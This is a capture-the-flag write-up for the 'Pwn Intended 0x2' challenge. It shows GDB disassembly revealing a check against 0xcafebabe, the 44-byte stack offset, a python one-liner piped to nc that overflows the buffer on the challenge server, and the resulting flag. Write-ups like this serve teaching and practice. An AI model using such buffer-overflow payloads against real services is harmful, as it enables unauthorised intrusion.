## Pwn Intended 0x2

### Writeup by Trent (teerix)

Category: Pwn

```
Travelling through spacetime!

nc chall.csivit.com 30007

File Included: pwn-intended-0x2 Binary
```

I decided to disassemble the main function of the binary file in GDB before 
trying any sort of fuzzing on their server implementation.

This stuck out at me immediately:

```
Dump of assembler code for function main:
   [Some output omitted]
   0x00000000004011ca <+116>:   cmp    DWORD PTR [rbp-0x4],0xcafebabe
   0x00000000004011d1 <+123>:   jne    0x4011f0 <main+154>
   0x00000000004011d3 <+125>:   lea    rdi,[rip+0xe66]        # 0x402040
   0x00000000004011da <+132>:   call   0x401030 <puts@plt>
   0x00000000004011df <+137>:   lea    rdi,[rip+0xe8a]        # 0x402070
   0x00000000004011e6 <+144>:   mov    eax,0x0
   0x00000000004011eb <+149>:   call   0x401050 <system@plt>
   0x00000000004011f0 <+154>:   mov    eax,0x0
   0x00000000004011f5 <+159>:   leave  
   0x00000000004011f6 <+160>:   ret    
```


Which seemingly meant that `$rbp-0x4` had to be overwritten with hex 0xcafebabe


Printing out $rbp-0x4 showed that it pointed to memory location 0x7fffffffdf7c.

Upon printing the stack out it can be seen that the memory location where 0xcafebabe should be placed was
44 bytes ahead in the stack.

Now I simply called python to take care of overwriting the stack and inserting the appropriate bytes at the offset:

`python -c 'print "A"*44+"\xbe\xba\xfe\xca"' | nc chall.csivit.com 30007`

Boom! We receive the message: "You've reached your destination, here's a flag!" along with the flag


Flag: csictf{c4n_y0u_re4lly_telep0rt?}
